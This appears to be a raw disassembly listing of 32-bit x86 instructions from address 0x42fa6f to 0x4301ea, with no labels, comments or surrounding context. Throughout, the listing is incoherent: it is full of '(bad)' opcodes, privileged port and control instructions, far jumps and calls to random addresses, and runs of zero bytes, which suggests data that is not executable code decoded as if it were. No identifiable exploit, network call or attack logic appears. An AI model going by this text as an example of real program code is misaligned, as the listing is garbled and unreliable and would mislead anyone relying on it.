  42fa6f:	push   cs
  42fa70:	add    BYTE PTR [ecx],bh
  42fa72:	dec    edi
  42fa73:	adc    eax,0x92cc5f8b
  42fa78:	leave  
  42fa79:	gs loopne 0x42fa0e
  42fa7c:	push   ebp
  42fa7e:	jecxz  0x42faf4
  42fa80:	call   DWORD PTR [ecx-0x3f173fb3]
  42fa86:	hlt    
  42fa87:	call   0x9369ad8b
  42fa8c:	div    ah
  42fa8e:	retf   
  42fa8f:	cmp    ebx,ebx
  42fa91:	add    BYTE PTR [eax],al
  42fa93:	add    BYTE PTR [eax],al
  42fa95:	add    BYTE PTR [edx-0x6f74bf12],ah
  42fa9b:	mov    edx,DWORD PTR [edi-0x6f]
  42fa9e:	nop
  42fa9f:	(bad)  [edi]
  42faa1:	call   0xfad88171
  42faa6:	sbb    ebx,DWORD PTR [esp+ebp*2-0x2e030729]
  42faad:	cli    
  42faae:	fbstp  TBYTE PTR [eax-0x576f9a1e]
  42fab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fab5:	mov    eax,0xfda26
  42faba:	mov    eax,0xbffaa527
  42fabf:	dec    edi
  42fac0:	mov    bh,0x5a
  42fac2:	push   esi
  42fac3:	aas    
  42fac4:	rcl    BYTE PTR [esi-0x2d],cl
  42fac7:	inc    eax
  42fac8:	sub    esp,DWORD PTR [esp+ecx*4]
  42facb:	test   al,0x3b
  42facd:	push   edx
  42face:	or     ecx,DWORD PTR [ebx-0x2df4acf2]
  42fad4:	push   esp
  42fad5:	cli    
  42fad6:	(bad)
  42fada:	imul   edi,eax,0xffffff94
  42fadd:	xchg   BYTE PTR [ebx+0x56],ah
  42fae0:	jge    0x42fb5b
  42fae2:	call   0x2ded:0x517ee840
  42fae9:	cmp    ecx,ecx
  42faeb:	(bad)  
  42faed:	or     BYTE PTR [ebx],cl
  42faef:	(bad)  
  42faf1:	les    ebx,FWORD PTR [ebx-0x2dfee364]
  42faf7:	pop    eax
  42faf8:	shl    BYTE PTR [edi],1
  42fafa:	add    BYTE PTR [eax],al
  42fafc:	add    BYTE PTR [eax],al
  42fafe:	add    dh,dl
  42fb00:	out    dx,al
  42fb01:	mov    bl,BYTE PTR [edx-0x22]
  42fb04:	push   ds
  42fb05:	imul   edi,DWORD PTR [ebp-0x186825],0xffffffc2
  42fb0c:	inc    eax
  42fb0d:	mov    eax,0x1e2e592e
  42fb12:	xchg   DWORD PTR [ecx],esp
  42fb14:	push   eax
  42fb15:	mov    BYTE PTR [eax],bh
  42fb17:	retf   
  42fb18:	mov    dl,0xf9
  42fb1a:	or     DWORD PTR [esi+0xe8a6063],edi
  42fb20:	scas   eax,DWORD PTR es:[edi]
  42fb21:	fwait
  42fb22:	retf   0xb34b
  42fb25:	rcl    DWORD PTR [ecx],0x94
  42fb28:	das    
  42fb29:	fbstp  TBYTE PTR ss:[ebp-0x5e]
  42fb2d:	clc    
  42fb2e:	rcl    BYTE PTR [edi-0x35],0x69
  42fb32:	fistp  QWORD PTR [ebx-0x35]
  42fb35:	ret    0x821f
  42fb38:	jb     0x42fb2f
  42fb3a:	adc    bl,0xbd
  42fb3d:	jb     0x42fb03
  42fb3f:	cmp    al,0xb1
  42fb41:	cmp    edx,ebx
  42fb43:	enter  0x7874,0xbf
  42fb47:	jg     0x42fad0
  42fb49:	inc    eax
  42fb4a:	add    BYTE PTR [eax+eiz*8],ch
  42fb4d:	or     al,0x7b
  42fb4f:	shr    DWORD PTR [ebx+0x2],1
  42fb52:	sub    ebx,esi
  42fb54:	mov    ecx,0x37432df5
  42fb59:	xor    ah,al
  42fb5b:	fwait
  42fb5c:	arpl   WORD PTR [edx+0x3f],di
  42fb5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb60:	bound  esi,QWORD PTR [eax-0x6b]
  42fb63:	add    BYTE PTR [eax],al
  42fb65:	add    BYTE PTR [eax],al
  42fb67:	add    BYTE PTR [edi+0x50],dh
  42fb6a:	pushf  
  42fb6b:	xchg   DWORD PTR [edx+0x30],edi
  42fb6e:	mov    dh,0x7
  42fb70:	test   BYTE PTR [ebx+0x7a],ah
  42fb73:	aas    
  42fb74:	lods   al,BYTE PTR ds:[esi]
  42fb75:	bound  esi,QWORD PTR [eax-0x4a]
  42fb78:	ja     0x42fb99
  42fb7a:	jge    0x42fb03
  42fb7c:	pop    edx
  42fb7d:	xor    BYTE PTR [esi],dh
  42fb7f:	pop    es
  42fb80:	xchg   esp,eax
  42fb81:	test   DWORD PTR ds:0x3585469b,esi
  42fb87:	inc    esp
  42fb88:	fld    TBYTE PTR [eax+0x37]
  42fb8b:	add    BYTE PTR [eax-0x682045c3],dl
  42fb91:	cmp    eax,0x6f0eff9e
  42fb96:	push   cs
  42fb97:	or     eax,0xe54f3118
  42fb9c:	dec    edx
  42fb9d:	repnz popa 
  42fb9f:	jmp    0x48cc:0x2d009e2
  42fba6:	out    dx,al
  42fba7:	pop    ss
  42fba8:	push   esp
  42fba9:	or     DWORD PTR [ecx-0x17],edi
  42fbac:	fwait
  42fbad:	push   ebp
  42fbae:	aam    0xab
  42fbb0:	xchg   ebx,eax
  42fbb1:	push   eax
  42fbb2:	es (bad) 
  42fbb4:	jl     0x42fb64
  42fbb6:	jmp    0x42fb70
  42fbb8:	sti    
  42fbb9:	aas    
  42fbba:	push   esp
  42fbbb:	call   0xfe154553
  42fbc0:	shl    BYTE PTR [eax],cl
  42fbc2:	inc    ebx
  42fbc3:	add    eax,0xd5b30c8
  42fbc8:	mov    esp,0x559763
  42fbcd:	add    BYTE PTR [eax],al
  42fbcf:	add    BYTE PTR [eax],al
  42fbd1:	mov    al,0xb1
  42fbd3:	cdq    
  42fbd4:	sbb    ebp,DWORD PTR [esp+ecx*8-0x459b93dc]
  42fbdb:	not    BYTE PTR ds:0x690eb290
  42fbe1:	lea    ebp,[esi-0x375eb8f2]
  42fbe7:	in     al,0xc1
  42fbe9:	push   edx
  42fbea:	dec    eax
  42fbeb:	cli    
  42fbec:	in     eax,0xc2
  42fbee:	xor    DWORD PTR [ebx-0x3b],ecx
  42fbf1:	arpl   WORD PTR [bx-0x1588],dx
  42fbf6:	arpl   WORD PTR [edx],dx
  42fbf8:	jmp    0xd14b:0x9b77aea2
  42fbff:	xor    eax,0x92cc0ea9
  42fc04:	sub    DWORD PTR [esi+0x35],eax
  42fc07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc08:	jmp    0xafdaaea0
  42fc0d:	aas    
  42fc0e:	dec    eax
  42fc0f:	jb     0x42fc16
  42fc11:	xor    al,0xc9
  42fc13:	nop
  42fc14:	add    BYTE PTR [edx-0x37],dl
  42fc17:	jmp    0x42fba1
  42fc19:	in     eax,dx
  42fc1a:	call   0x43fa0b3a
  42fc1f:	jmp    0x42fc20
  42fc21:	sub    esp,esp
  42fc23:	(bad)  
  42fc24:	push   ebp
  42fc25:	add    BYTE PTR [ecx+0x4c3e1032],0x24
  42fc2c:	add    esp,DWORD PTR [eax-0x567a051c]
  42fc32:	scas   eax,DWORD PTR es:[edi]
  42fc33:	and    BYTE PTR [ebx],dh
  42fc35:	add    BYTE PTR [eax],al
  42fc37:	add    BYTE PTR [eax],al
  42fc39:	add    BYTE PTR [eax+0x6008404a],ah
  42fc3f:	xor    DWORD PTR [edx],0x6cc77220
  42fc45:	shl    cl,0xaa
  42fc48:	add    al,BYTE PTR [ebx]
  42fc4a:	clc    
  42fc4b:	jge    0x42fca9
  42fc4d:	(bad)  
  42fc4e:	mov    esp,0xa94000a8
  42fc53:	xor    eax,edx
  42fc55:	or     al,0x2c
  42fc57:	out    dx,al
  42fc58:	pop    edi
  42fc59:	jbe    0x42fc7d
  42fc5b:	mov    dh,BYTE PTR [edx]
  42fc5d:	and    BYTE PTR [ebx+esi*1-0x31],ch
  42fc61:	cmp    BYTE PTR [eax],dh
  42fc63:	mov    dh,BYTE PTR [edx]
  42fc65:	and    BYTE PTR [edi+edx*4],dh
  42fc68:	push   ss
  42fc69:	cmp    esp,DWORD PTR [ebp+0x4a7c03d2]
  42fc6f:	xchg   esi,eax
  42fc70:	xchg   ebx,eax
  42fc71:	into   
  42fc72:	adc    DWORD PTR [edi],ebx
  42fc74:	out    0xff,al
  42fc76:	push   es
  42fc77:	xor    ebp,DWORD PTR [ebp+esi*2+0x44d4b72]
  42fc7e:	loop   0x42fc86
  42fc80:	jne    0x42fc4b
  42fc82:	and    DWORD PTR [ebx+0x74216a18],esi
  42fc88:	aas    
  42fc89:	push   ecx
  42fc8a:	ror    BYTE PTR [eax-0x6fc300ee],0x0
  42fc91:	inc    eax
  42fc92:	nop
  42fc93:	(bad)  [esi+0x4e5484c3]
  42fc99:	and    al,0x80
  42fc9b:	inc    esp
  42fc9c:	es and al,0x0
  42fc9f:	add    BYTE PTR [eax],al
  42fca1:	add    BYTE PTR [eax],al
  42fca3:	jl     0x42fcbe
  42fca5:	pop    eax
  42fca7:	pop    eax
  42fca8:	les    ecx,FWORD PTR [esi+0x4]
  42fcab:	or     DWORD PTR [esi],ecx
  42fcad:	int3   
  42fcae:	bndstx [esi],bnd2
  42fcb1:	int3   
  42fcb2:	pop    ss
  42fcb3:	sbb    DWORD PTR [esi],edx
  42fcb5:	int3   
  42fcb6:	adc    ecx,DWORD PTR [edi-0x804e5b3]
  42fcbc:	mov    eax,0x281b5d31
  42fcc1:	in     al,dx
  42fcc2:	retw   0x66f1
  42fcc6:	leave  
  42fcc7:	call   0xd83d4ff9
  42fccc:	mov    DWORD PTR [edi],ecx
  42fcce:	pop    edx
  42fccf:	imul   ebx,DWORD PTR [ebx+ebp*4+0xb],0xffffffd2
  42fcd4:	ror    DWORD PTR [edi],0x85
  42fcd7:	lods   eax,DWORD PTR ds:[esi]
  42fcd8:	popa   
  42fcd9:	jne    0x42fd40
  42fcdb:	nop
  42fcdc:	cmp    BYTE PTR [ebx],0x87
  42fcdf:	fsubrp st(1),st
  42fce1:	fld    DWORD PTR [eax]
  42fce3:	nop
  42fce4:	fld    DWORD PTR [esi-0x1181ef4c]
  42fcea:	pop    es
  42fceb:	nop
  42fcec:	lahf   
  42fced:	cmp    DWORD PTR [edi-0x791c09f4],eax
  42fcf3:	sbb    DWORD PTR [ebp-0xb8a1816],0x9009fa91
  42fcfd:	push   cs
  42fcfe:	push   ebx
  42fcff:	sbb    edi,edi
  42fd01:	xchg   ebp,edx
  42fd03:	fs dec eax
  42fd05:	xchg   edx,eax
  42fd06:	add    DWORD PTR [eax],0x0
  42fd09:	add    BYTE PTR [eax],al
  42fd0b:	add    BYTE PTR [eax-0x3a],dl
  42fd0e:	jmp    0x42fd3d
  42fd10:	push   eax
  42fd11:	xor    al,0xc3
  42fd13:	xchg   dh,ah
  42fd15:	mov    dl,0xf9
  42fd17:	inc    ecx
  42fd18:	scas   eax,DWORD PTR es:[edi]
  42fd19:	in     al,0x2d
  42fd1b:	jns    0x42fd66
  42fd1d:	(bad)  
  42fd1f:	inc    esp
  42fd20:	cmp    al,bh
  42fd22:	jno    0x42fce7
  42fd24:	mov    ds:0x8c3d60dc,eax
  42fd29:	cmp    ebx,DWORD PTR [esi]
  42fd2b:	sbb    BYTE PTR [ecx-0x76],cl
  42fd2e:	clc    
  42fd2f:	cmc    
  42fd30:	lods   eax,DWORD PTR ds:[esi]
  42fd31:	mov    dh,BYTE PTR [ebp-0x43c69ed4]
  42fd37:	dec    DWORD PTR [edx]
  42fd39:	popf   
  42fd3a:	test   eax,0x78b2bfed
  42fd3f:	mov    edi,0x24f7028b
  42fd44:	dec    edx
  42fd45:	hlt    
  42fd46:	fld    QWORD PTR [ebx]
  42fd48:	addr16 (bad) 
  42fd4a:	int    0x30
  42fd4c:	inc    ebp
  42fd4d:	pusha  
  42fd4e:	mov    WORD PTR [ecx],ds
  42fd50:	cwde   
  42fd51:	sub    edx,0x75
  42fd54:	push   ebx
  42fd55:	mov    gs,ecx
  42fd57:	fcom   DWORD PTR [edi+0x3b]
  42fd5a:	iret   
  42fd5b:	and    DWORD PTR [edx+edx*2+0x3bb7c3eb],0x42
  42fd63:	sub    BYTE PTR [eax+0x3b],cl
  42fd66:	adc    esp,eax
  42fd68:	xor    DWORD PTR [edx-0xb],0x3c3583ed
  42fd6f:	add    eax,0x0
  42fd74:	add    BYTE PTR [eax+0x35],al
  42fd77:	xor    ch,BYTE PTR [eax]
  42fd79:	mov    esp,0x9a5bb462
  42fd7e:	cld    
  42fd7f:	xor    DWORD PTR [eax],ebp
  42fd81:	(bad)  [ecx]
  42fd83:	mov    edx,0xf6ad821c
  42fd88:	in     eax,dx
  42fd89:	nop
  42fd8a:	imul   esp,esp,0xffffffc8
  42fd8d:	push   eax
  42fd8e:	cmp    esi,DWORD PTR [edx]
  42fd90:	sub    bl,dl
  42fd92:	dec    esp
  42fd93:	push   cs
  42fd94:	mov    al,0x61
  42fd96:	stos   DWORD PTR es:[edi],eax
  42fd97:	(bad)  
  42fd98:	sar    BYTE PTR ds:0xa8af99b2,1
  42fd9e:	bound  ebx,QWORD PTR [ecx+0x3e7e77a5]
  42fda4:	push   esi
  42fda5:	fist   DWORD PTR [ebx-0x69]
  42fda8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fda9:	mov    WORD PTR [ebp-0x2e],es
  42fdac:	cmc    
  42fdad:	cmp    DWORD PTR [ebx],edi
  42fdaf:	push   ebx
  42fdb0:	add    eax,0xeb14c064
  42fdb5:	pop    ds
  42fdb6:	test   eax,0x8d01f074
  42fdbb:	bound  eax,QWORD PTR [eax]
  42fdbd:	div    BYTE PTR [ebp+0x629ea799]
  42fdc3:	cdq    
  42fdc4:	lods   eax,DWORD PTR ds:[esi]
  42fdc5:	scas   eax,DWORD PTR es:[edi]
  42fdc6:	xchg   BYTE PTR [esi],bh
  42fdc8:	push   cs
  42fdc9:	dec    ebx
  42fdca:	push   ebx
  42fdcb:	xchg   edi,eax
  42fdcc:	scas   eax,DWORD PTR es:[edi]
  42fdcd:	mov    dh,0x45
  42fdcf:	shr    ch,cl
  42fdd1:	jmp    0xd0105110
  42fdd6:	dec    edi
  42fdd7:	or     eax,0x5c
  42fddc:	add    BYTE PTR [eax],al
  42fdde:	fcom   DWORD PTR [ecx-0x12e8c6fe]
  42fde4:	imul   dh
  42fde6:	adc    cl,cl
  42fde8:	jmp    0x42fe20
  42fdea:	mov    dl,0x66
  42fdec:	inc    edi
  42fded:	push   0x57
  42fdef:	jge    0x42fdc1
  42fdf1:	in     eax,dx
  42fdf2:	xchg   ebx,eax
  42fdf3:	pusha  
  42fdf4:	inc    ebx
  42fdf5:	jb     0x42fe13
  42fdf7:	int    0xe1
  42fdf9:	add    edx,DWORD PTR [edx]
  42fdfb:	leave  
  42fdfc:	xchg   edi,eax
  42fdfd:	xor    eax,0x7244a2b8
  42fe02:	loop   0x42fe3e
  42fe04:	push   ebp
  42fe05:	in     eax,0xeb
  42fe07:	shl    edi,cl
  42fe09:	xchg   esi,eax
  42fe0a:	adc    dh,BYTE PTR [ecx]
  42fe0c:	iret   
  42fe0d:	adc    eax,0x532d8c
  42fe12:	push   ebp
  42fe13:	mov    ch,0x73
  42fe15:	rcl    BYTE PTR [ecx-0x54],0xf
  42fe19:	push   0x21
  42fe1b:	jmp    0x42fe78
  42fe1d:	jmp    DWORD PTR [ebp+eiz*8-0x3]
  42fe21:	aas    
  42fe22:	cmp    DWORD PTR [eax+edx*8],ebp
  42fe25:	or     al,0x19
  42fe27:	scas   al,BYTE PTR es:[edi]
  42fe28:	inc    edi
  42fe29:	pop    esi
  42fe2a:	imul   esi,DWORD PTR [ebp-0x1615aef2],0x3d
  42fe31:	mov    esp,ebp
  42fe33:	mov    WORD PTR [edx],es
  42fe35:	imul   esp,DWORD PTR [edi-0x77],0xffffff93
  42fe39:	shl    esi,0xab
  42fe3c:	push   ds
  42fe3d:	mov    edi,DWORD PTR ds:0x890a8d
  42fe43:	add    BYTE PTR [eax],al
  42fe45:	add    BYTE PTR [eax],al
  42fe47:	xor    eax,0x5232fe8d
  42fe4c:	aaa    
  42fe4d:	push   0xce7bc924
  42fe52:	data16 shl bh,0xb
  42fe56:	je     0x42fe5e
  42fe58:	xlat   BYTE PTR ds:[ebx]
  42fe59:	jge    0x46dca36d
  42fe5f:	mov    ebp,0xe4ff5be9
  42fe64:	int3   
  42fe65:	std    
  42fe66:	aas    
  42fe67:	mov    ecx,0x340cd02d
  42fe6c:	outs   dx,BYTE PTR ds:[esi]
  42fe6d:	pop    edi
  42fe6e:	sub    bh,BYTE PTR [eax+0x37]
  42fe71:	pop    eax
  42fe72:	and    al,0xa5
  42fe74:	fcomi  st,st(3)
  42fe76:	or     ebp,0xe985e932
  42fe7c:	mov    ds:0x6e25c087,al
  42fe81:	bound  ebp,QWORD PTR [edx]
  42fe83:	cmc    
  42fe84:	xor    DWORD PTR [ebx+0x10],esp
  42fe87:	mov    ds:0x7d4699ba,eax
  42fe8c:	fstp   QWORD PTR [ebx-0x1]
  42fe8f:	nop
  42fe90:	(bad)  
  42fe91:	retf   
  42fe92:	adc    eax,edx
  42fe94:	fst    DWORD PTR [edx+0xf8894c3]
  42fe9a:	or     esp,DWORD PTR [edi]
  42fe9c:	lea    esi,[edx]
  42fe9e:	bound  ebx,QWORD PTR [ecx-0x658bcd6d]
  42fea4:	dec    ebp
  42fea5:	lea    esi,[esp+ecx*4-0xd]
  42fea9:	cwde   
  42feaa:	inc    ecx
  42feab:	add    BYTE PTR [eax],al
  42fead:	add    BYTE PTR [eax],al
  42feaf:	add    BYTE PTR [eax+0x28],dh
  42feb2:	adc    BYTE PTR [edi],ch
  42feb4:	push   eax
  42feb5:	hlt    
  42feb6:	sub    BYTE PTR [ebx+0x64],al
  42feb9:	ffree  st(4)
  42febb:	cmp    BYTE PTR gs:[esi],0xdd
  42febf:	and    ecx,DWORD PTR ds:0xc055340c
  42fec5:	jl     0x42feca
  42fec7:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42fec9:	sbb    DWORD PTR [eax],edx
  42fecb:	jg     0x42fe99
  42fecd:	mov    ebp,0xdf84bf94
  42fed2:	rol    BYTE PTR [esi+0x5503f544],0xf8
  42fed9:	cmp    BYTE PTR [edx+edi*8-0x19],ch
  42fedd:	push   esi
  42fede:	push   edx
  42fedf:	or     bh,bh
  42fee1:	cdq    
  42fee2:	xchg   esi,eax
  42fee3:	mov    edi,0xfa93ef5d
  42fee8:	inc    ebp
  42fee9:	jmp    0x94580ee7
  42feee:	ss push ebp
  42fef0:	pusha  
  42fef1:	in     al,0x4
  42fef3:	pop    esp
  42fef4:	sahf   
  42fef5:	cdq    
  42fef6:	adc    bh,BYTE PTR [edi-0x2c]
  42fef9:	in     eax,0xa2
  42fefb:	add    BYTE PTR [edi+0x3633d644],dl
  42ff01:	mov    dl,0xd8
  42ff03:	xor    ebx,DWORD PTR [edi+ecx*8]
  42ff06:	xchg   ebx,eax
  42ff07:	cli    
  42ff08:	add    eax,0xce88f5ce
  42ff0d:	mov    dl,0xc9
  42ff0f:	mov    ah,0x90
  42ff11:	arpl   WORD PTR [ebx],bp
  42ff13:	fild   WORD PTR [eax]
  42ff15:	add    BYTE PTR [eax],al
  42ff17:	add    BYTE PTR [eax],al
  42ff19:	or     eax,0x2ddb20ef
  42ff1e:	mov    dh,0xf5
  42ff20:	(bad)  [esi]
  42ff22:	shl    DWORD PTR [eax-0x31],0xb3
  42ff26:	mov    edx,0x5793c960
  42ff2b:	scas   al,BYTE PTR es:[edi]
  42ff2c:	cmp    ecx,DWORD PTR [edi-0x4b]
  42ff2f:	adc    BYTE PTR [edi+edi*2-0x51],al
  42ff33:	sti    
  42ff34:	cmp    al,0x8a
  42ff36:	inc    eax
  42ff37:	loopne 0x42ff0c
  42ff39:	add    al,0x61
  42ff3b:	std    
  42ff3c:	imul   edi,DWORD PTR [esp+eax*1],0x5d
  42ff40:	sub    BYTE PTR [esi],0xb0
  42ff43:	out    0x43,eax
  42ff45:	adc    esi,edx
  42ff47:	mov    eax,ds:0xf9741b13
  42ff4c:	mov    WORD PTR [ecx-0x52],fs
  42ff4f:	rcl    BYTE PTR [ebp-0x41],1
  42ff52:	aaa    
  42ff53:	and    al,0x6b
  42ff55:	std    
  42ff56:	add    eax,0xf059800d
  42ff5b:	stc    
  42ff5c:	add    ebp,DWORD PTR [edi-0x2a]
  42ff5f:	(bad)
  42ff62:	pop    esp
  42ff63:	pusha  
  42ff64:	div    DWORD PTR [ebx+0x5b8c8472]
  42ff6a:	mov    gs,WORD PTR [ebp-0x75cb4774]
  42ff70:	daa    
  42ff71:	je     0x42ffcb
  42ff73:	jmp    0x5a7bc2a2
  42ff78:	sub    BYTE PTR [edi+esi*1+0x2bad],bl
  42ff7f:	add    BYTE PTR [eax],al
  42ff81:	add    bl,bl
  42ff83:	outs   dx,WORD PTR ds:[esi]
  42ff85:	or     BYTE PTR [edx-0x6c740880],al
  42ff8b:	mov    eax,ds:0xbe1ccb37
  42ff90:	push   cs
  42ff91:	cli    
  42ff92:	add    eax,0x85e5617b
  42ff97:	imul   ebx,DWORD PTR [ecx+0x379aa83d],0x326605b6
  42ffa1:	std    
  42ffa2:	sbb    bl,ah
  42ffa4:	xchg   edi,eax
  42ffa5:	and    al,0x8c
  42ffa7:	inc    ecx
  42ffa8:	into   
  42ffa9:	icebp  
  42ffaa:	xchg   edx,eax
  42ffab:	add    DWORD PTR [eax],edi
  42ffad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffae:	push   0xffffffa6
  42ffb0:	xchg   edi,eax
  42ffb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffb2:	sbb    eax,0x31213276
  42ffb7:	cmp    edi,esp
  42ffb9:	jae    0x42ff43
  42ffbb:	lods   eax,DWORD PTR ds:[esi]
  42ffbc:	and    al,ch
  42ffbe:	or     esi,DWORD PTR [esi+0x4740a818]
  42ffc4:	loop   0x430028
  42ffc6:	nop
  42ffc7:	xchg   esi,eax
  42ffc8:	push   esi
  42ffc9:	jb     0x42ffeb
  42ffcb:	xchg   esi,eax
  42ffcc:	(bad)  
  42ffcd:	sar    BYTE PTR [edi+0x2f],cl
  42ffd0:	push   ebx
  42ffd1:	or     eax,0xa59962b0
  42ffd6:	scas   eax,DWORD PTR es:[edi]
  42ffd7:	xchg   BYTE PTR [esi],bh
  42ffd9:	es cdq 
  42ffdb:	push   esi
  42ffdc:	add    al,0xa9
  42ffde:	xchg   ebx,eax
  42ffdf:	inc    ecx
  42ffe0:	shl    ch,cl
  42ffe2:	sbb    BYTE PTR [edx],al
  42ffe4:	repz add BYTE PTR [bx+si],al
  42ffe8:	add    BYTE PTR [eax],al
  42ffea:	add    BYTE PTR [edx],bl
  42ffec:	data16 xor bl,ch
  42ffef:	aad    0x40
  42fff1:	iret   
  42fff2:	rcr    DWORD PTR [edx+0x4751247],0x41
  42fff9:	(bad)  
  42fffa:	out    dx,al
  42fffb:	out    0x5b,al
  42fffd:	dec    ecx
  42fffe:	inc    edx
  42ffff:	adc    esi,esi
  430001:	push   ds
  430002:	stos   DWORD PTR es:[edi],eax
  430003:	mov    esi,DWORD PTR [edx-0x30c55069]
  430009:	aas    
  43000a:	aaa    
  43000b:	mov    edi,0x9a00e638
  430010:	inc    edi
  430011:	es ja  0x42ffc1
  430014:	mov    edi,0x2c278b2d
  430019:	adc    DWORD PTR [ebx+0x1474ad39],eax
  43001f:	push   0x74
  430021:	pop    ebx
  430022:	call   FWORD PTR [ebp+0x6cff068a]
  430028:	fscale 
  43002a:	aas    
  43002b:	jns    0x430061
  43002d:	ror    BYTE PTR [esp+ebp*8],1
  430030:	jne    0x430091
  430032:	adc    ch,BYTE PTR [edi+0x238ad35]
  430038:	enter  0x7c0f,0x15
  43003c:	xor    al,0xd4
  43003e:	call   DWORD PTR [esi-0x21]
  430041:	inc    esp
  430042:	ret    0xb52d
  430045:	xchg   ebx,eax
  430046:	(bad)  
  430047:	rol    BYTE PTR [edi+0x3c],cl
  43004a:	rol    BYTE PTR [eax+0x740fe7],cl
  430050:	add    BYTE PTR [eax],al
  430052:	add    BYTE PTR [eax],al
  430054:	(bad)  
  430055:	fsub   DWORD PTR [esi]
  430057:	push   ecx
  430058:	mov    DWORD PTR [ebx-0x19ff99f3],edi
  43005e:	pop    ds
  43005f:	je     0x430042
  430061:	xor    al,0xe2
  430063:	adc    al,0x1a
  430065:	mov    al,0x17
  430067:	mov    dh,0xab
  430069:	aas    
  43006a:	test   eax,0x16ad0580
  43006f:	add    ch,bh
  430071:	dec    edi
  430072:	imul   edi,edx,0xffffffbd
  430075:	scas   eax,DWORD PTR es:[edi]
  430076:	add    eax,0xc3ce83aa
  43007c:	cmp    dl,BYTE PTR [ecx+0x33]
  43007f:	push   ebx
  430080:	sbb    al,0xe7
  430082:	xchg   esp,eax
  430083:	je     0x430012
  430085:	jle    0x4300c6
  430087:	lea    esi,[ebp-0x76]
  43008a:	xor    ch,BYTE PTR [edx-0x70]
  43008d:	mov    edi,0xf11bca36
  430092:	xor    eax,0x16453dda
  430097:	cmp    DWORD PTR [edx-0x28],esp
  43009a:	xchg   edi,eax
  43009b:	add    ecx,ebx
  43009d:	nop
  43009e:	(bad)  [esp+edi*2+0x5f]
  4300a2:	mov    esi,0x6a3a023
  4300a7:	daa    
  4300a8:	pop    esi
  4300a9:	in     eax,0x59
  4300ab:	pop    edx
  4300ac:	sbb    cl,dh
  4300ae:	sbb    eax,0x16518e2e
  4300b3:	xor    esi,edx
  4300b5:	mov    bl,ah
  4300b7:	repz add BYTE PTR [eax],al
  4300ba:	add    BYTE PTR [eax],al
  4300bc:	add    dl,ch
  4300be:	in     eax,0x9c
  4300c0:	inc    ebx
  4300c1:	je     0x4300a0
  4300c3:	mov    edi,0x3bf5cc8c
  4300c8:	push   eax
  4300c9:	aas    
  4300ca:	mov    edi,0xc9d011f3
  4300cf:	mov    es,ebx
  4300d1:	pushf  
  4300d2:	or     dl,cl
  4300d4:	pop    esp
  4300d5:	retf   
  4300d6:	dec    esp
  4300d7:	push   esi
  4300d8:	daa    
  4300d9:	push   edx
  4300da:	into   
  4300db:	andnps xmm1,XMMWORD PTR [ebx]
  4300de:	outs   dx,BYTE PTR ds:[esi]
  4300df:	(bad)  
  4300e0:	jmp    0x4300ee
  4300e2:	retf   
  4300e3:	lldt   WORD PTR ds:0xfffa165f
  4300ea:	cwde   
  4300eb:	mov    ebp,0xc3efe851
  4300f0:	cli    
  4300f1:	out    dx,eax
  4300f2:	fadd   QWORD PTR [esi+0x3e]
  4300f5:	inc    ebx
  4300f6:	pop    esi
  4300f7:	fcomi  st,st(3)
  4300f9:	call   0xd83ce665
  4300fe:	dec    esi
  4300ff:	xchg   ebx,eax
  430100:	pop    es
  430101:	into   
  430102:	enter  0x4f6a,0xc7
  430106:	out    0xdf,al
  430108:	or     eax,0xf5b250
  43010d:	shl    BYTE PTR [edx+0x7a],1
  430110:	xchg   BYTE PTR [edi+0x577cc4c0],dl
  430116:	sub    eax,0x9db7780b
  43011b:	push   ecx
  43011c:	jle    0x4300b8
  43011e:	add    BYTE PTR [edx],bl
  430120:	add    DWORD PTR [eax],0x0
  430126:	shl    DWORD PTR [edx-0x6bfcbc87],cl
  43012c:	dec    edi
  43012d:	adc    al,0xd
  43012f:	xor    eax,0xbf7a7d7a
  430134:	and    eax,0x8dc6dc8f
  430139:	add    ah,ah
  43013b:	rcr    BYTE PTR [edi+eax*4-0x2d1cb9e1],0xc1
  430143:	sub    eax,0x2437783b
  430148:	loop   0x4301c7
  43014a:	dec    edx
  43014b:	ss mov dh,0xf6
  43014e:	lahf   
  43014f:	dec    esp
  430150:	jmp    0x4ca8393e
  430155:	push   ss
  430156:	mov    al,0xa8
  430158:	mov    ch,0x3
  43015a:	scas   al,BYTE PTR es:[edi]
  43015b:	mov    ds:0xc013864a,al
  430160:	push   esp
  430161:	jl     0x43012a
  430163:	push   0xa86c162c
  430168:	mov    ch,0x3
  43016a:	xchg   esi,esi
  43016c:	mov    ebp,0xa32ce731
  430171:	ja     0x430162
  430173:	push   ds
  430174:	mov    cl,0x7d
  430176:	jmp    0x4ab2:0x900213fb
  43017d:	mov    ss,WORD PTR [ebx-0x2e83eb40]
  430183:	mov    al,0xf5
  430185:	ret    0x4555
  430188:	push   cs
  430189:	lock add BYTE PTR [eax],al
  43018c:	add    BYTE PTR [eax],al
  43018e:	add    ah,ah
  430190:	xor    al,0xd0
  430192:	xchg   edx,eax
  430193:	dec    edx
  430194:	add    ch,ah
  430196:	in     al,dx
  430197:	pop    ebx
  430198:	cmp    eax,0x4594e952
  43019d:	and    DWORD PTR [edi],edi
  43019f:	jmp    0xeb64:0x94259046
  4301a6:	fsub   QWORD PTR [ebx]
  4301a8:	lods   eax,DWORD PTR ds:[esi]
  4301a9:	dec    esi
  4301aa:	jmp    0x6c09b8b0
  4301af:	push   eax
  4301b0:	mov    esi,0xcaa3340e
  4301b5:	cmp    esp,DWORD PTR [esi-0x566d4705]
  4301bb:	pusha  
  4301bc:	lods   al,BYTE PTR ds:[esi]
  4301bd:	(bad)  
  4301be:	int3   
  4301bf:	mov    edi,0x93e9523f
  4301c4:	xor    bl,BYTE PTR [edx]
  4301c6:	mov    eax,ds:0xe80e720e
  4301cb:	popa   
  4301cc:	mov    ecx,0x729e8101
  4301d1:	push   cs
  4301d2:	paddb  mm1,QWORD PTR [ecx-0x26c5271]
  4301d9:	inc    esp
  4301da:	rcr    DWORD PTR [edi-0x21be21cb],cl
  4301e0:	mov    eax,0x64444eeb
  4301e5:	jmp    0x4301c3
  4301e7:	aaa    
  4301e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301e9:	dec    esi
  4301ea:	jmp    0x3e5df405
